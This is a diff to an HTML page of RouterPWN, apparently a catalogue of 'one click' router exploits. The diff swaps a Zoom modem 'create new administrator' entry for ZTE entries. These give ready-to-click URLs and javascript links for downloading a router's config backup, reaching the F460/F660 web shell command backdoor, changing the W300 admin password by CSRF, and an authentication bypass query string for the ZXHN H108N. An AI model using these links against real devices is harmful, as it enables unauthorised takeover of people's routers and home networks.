@@ -2,7 +2,7 @@
 <html>
  <head>
   <title>
-   RouterPWN - Zoom - One click exploits, News, Vulnerabilities, POC, Alerts
+   RouterPWN - ZTE - One click exploits, News, Vulnerabilities, POC, Alerts
   </title>
   <link href="includes/images/favicon.png" rel="apple-touch-icon"/>
   <link href="includes/images/favicon.ico" rel="shortcut icon"/>
@@ -76,9 +76,9 @@
     </tr>
     <tr>
      <td>
-      <section id="zoom">
+      <section id="zte">
        <h1>
-        Zoom
+        ZTE
        </h1>
        <table cellspacing="0" class="display" id="tabla" width="100%">
         <thead>
@@ -122,21 +122,93 @@
         <tbody>
          <tr>
           <td>
-           07/10/13
+           12/09/14
           </td>
           <td>
            One click
           </td>
           <td>
-           <a href="http://www.exploit-db.com/exploits/26736/">
-            www.exploit-db.com
+           <a href="https://github.com/hkm/www.routerpwn.com/issues/53">
+            github.com
            </a>
           </td>
           <td>
-           <a href="javascript:zoomX_newadmin()">
-            Zoom X4, X5 ADSL Modem and Router - Create New Administrator Account
+           <a href="http://192.168.1.1/manager_dev_config_t.gch">
+            ZTE ZXV10H108L - Download Config Backup File
            </a>
-           <a href="javascript:zoomX_newadmin(ip)" onclick="return ip=prompt('IP:');">
+           <a href="javascript:setip('/manager_dev_config_t.gch');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           12/09/14
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="https://community.rapid7.com/community/infosec/blog/2014/03/03/disclosure-r7-2013-18-zte-f460-and-zte-f660-webshellcmdgch-backdoor">
+            community.rapid7.com
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.1.1/web_shell_cmd.gch">
+            ZTE F460 - F660 - Web CMD Backdoor
+           </a>
+           <a href="javascript:setip('/web_shell_cmd.gch');">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           07/17/14
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://packetstormsecurity.com/files/127129/ZTE-WXV10-W300-Disclosure-CSRF-Default.html">
+            packetstormsecurity.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:wxv10w300_changeadmin()">
+            ZTE WXV10 W300 - Change Admin Password
+           </a>
+           <a href="javascript:wxv10w300_changeadmin(ip)">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Author
+          </td>
+         </tr>
+         <tr>
+          <td>
+           01/15/14
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="https://github.com/hkm/www.routerpwn.com/issues/1">
+            github.com
+           </a>
+          </td>
+          <td>
+           <a href="https://192.168.1.1/cgi-bin/webproc?getpage=html/index.html&amp;var:menu=setup&amp;var:page=wancfg&amp;obj-action=auth">
+            ZTE ZXHN H108N Admin Authentication Bypass
+           </a>
+           <a href="javascript:setipssl('cgi-bin/webproc?getpage=html/index.html&amp;var:menu=setup&amp;var:page=wancfg&amp;obj-action=auth')" onclick="return ip=prompt('IP:');">
             [SET IP]
            </a>
           </td>
